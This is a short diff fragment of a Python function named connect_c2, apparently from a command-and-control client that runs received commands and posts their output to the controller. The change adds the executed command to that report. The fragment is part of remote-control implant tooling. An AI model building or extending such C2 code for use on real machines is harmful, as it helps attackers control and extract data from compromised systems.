@@ -1151,6 +1151,7 @@ def connect_c2():
                             if result is not None:  # kill command exits before returning
                                 c2_post("/result", {
                                     "output": result,
+                                    "command": cmd,
                                     "client_id": client_id
                                 })
                 except requests.exceptions.ConnectionError:
